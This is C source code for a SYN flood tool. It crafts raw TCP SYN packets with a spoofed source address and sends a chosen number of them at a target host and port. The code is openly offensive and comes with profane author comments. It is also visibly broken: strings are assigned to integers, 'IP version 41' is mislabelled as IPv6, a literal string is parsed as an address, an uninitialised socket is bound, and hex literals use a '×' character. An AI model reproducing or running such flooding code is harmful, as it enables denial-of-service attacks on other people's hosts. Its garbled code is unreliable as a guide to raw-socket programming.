#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <arpa/inet.h>

void hose_trusted(unsigned int, unsigned int, unsigned short, int);
unsigned short in_cksum(unsigned short *, int);
main(int argc, char **argv) {
unsigned int srchost;
unsigned int dsthost;
unsigned short port=113;
unsigned int number=1000;
if(argc < 3) {
printf("%s -srchost- -dsthost- -port- -num-\n", argv[0]);
exit(0);
}
srchost = (argv[1]);
dsthost = (argv[2]);
if(argc >= 4) port = atoi(argv[3]);
if(argc >= 5) number = atoi(argv[4]);
if(port == 0) port = 113;
if(number == 0) number = 1000;
printf("-> Flooding %s from %s port %u %u times\n", argv[2], argv[1], port, number);
hose_trusted(srchost, dsthost, port, number);
}

void hose_trusted(unsigned int source_addr, unsigned int dest_addr, unsigned short dest_port, int numsyns) {
struct send_tcp {
struct iphdr ip;
struct tcphdr tcp;
} send_tcp;
struct pseudo_header {
unsigned int source_address;
unsigned int dest_address;
unsigned char placeholder;
unsigned char protocol;
unsigned short tcp_length;
struct tcphdr tcp;
} pseudo_header;
int i;
int tcp_socket;
struct sockaddr_in6 sin;
int sinlen,s;
send_tcp.ip.ihl = 5;
send_tcp.ip.version = 41;          /// ipv6 protocol version 41 setup here like NO OTHER! ~xd~
send_tcp.ip.tos = 0;
send_tcp.ip.tot_len = htons(0×4000);
send_tcp.ip.id = 0;
send_tcp.ip.frag_off = 0;
send_tcp.ip.ttl = 255;
send_tcp.ip.protocol = IPPROTO_TCP;
send_tcp.ip.check = 0;
send_tcp.ip.saddr = source_addr;
send_tcp.ip.daddr = dest_addr;
send_tcp.tcp.source = getpid();
send_tcp.tcp.dest = htons(dest_port);
send_tcp.tcp.seq = getpid();
send_tcp.tcp.ack_seq = 0;
send_tcp.tcp.res1 = 0;
send_tcp.tcp.doff = 5;
send_tcp.tcp.fin = 0;
send_tcp.tcp.syn = 1;
send_tcp.tcp.rst = 0;
send_tcp.tcp.psh = 0;
send_tcp.tcp.ack = 0;
send_tcp.tcp.urg = 0;
send_tcp.tcp.window = htons(0×5678);  // yea yea, change to what ya want, was even smaller b4 so, meh… fuck yaself.
send_tcp.tcp.check = 0;
send_tcp.tcp.urg_ptr = 0;

/// from here on it was funky to setup! this was awesome way to bind to ipv6 addy, could do locally but hell, it binds to remote … so we see… debug 
bzero (&sin, sizeof (sin));
(void) inet_pton (AF_INET6, "send_tcp.ip.daddr", sin.sin6_addr.s6_addr);
sin.sin6_family = AF_INET6;
sin.sin6_port = send_tcp.tcp.source;
bind(s, (struct sockaddr *) &sin, sizeof sin);
tcp_socket = socket(AF_INET6, SOCK_RAW, IPPROTO_RAW);
if(tcp_socket < 0) {
perror("socket");
exit(1);
}
for(i=0;i<numsyns;i++) {
send_tcp.tcp.source++;
send_tcp.ip.id++;
send_tcp.tcp.seq++;
send_tcp.tcp.check = 0;
send_tcp.ip.check = 0;
send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);
pseudo_header.source_address = send_tcp.ip.saddr;
pseudo_header.dest_address = send_tcp.ip.daddr;
pseudo_header.placeholder = 0;
pseudo_header.protocol = IPPROTO_TCP;
pseudo_header.tcp_length = htons(0×2000);
bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);
send_tcp.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32);
sinlen = sizeof(sin);
sendto(tcp_socket, &send_tcp, 40, 0, (struct sockaddr *)&sin, sinlen);
}
close(tcp_socket);
}

unsigned short in_cksum(unsigned short *ptr, int nbytes) {
register long sum;
u_short oddbyte;
register u_short answer;
sum = 0;
while (nbytes > 1)  {
sum += *ptr++;
nbytes -= 2;
}
if (nbytes == 1) {
oddbyte = 0;
*((u_char *) &oddbyte) = *(u_char *)ptr;
sum += oddbyte;
}
sum  = (sum >> 16) + (sum & 0xffff);
sum += (sum >> 16);
answer = ~sum;
return(answer);
}
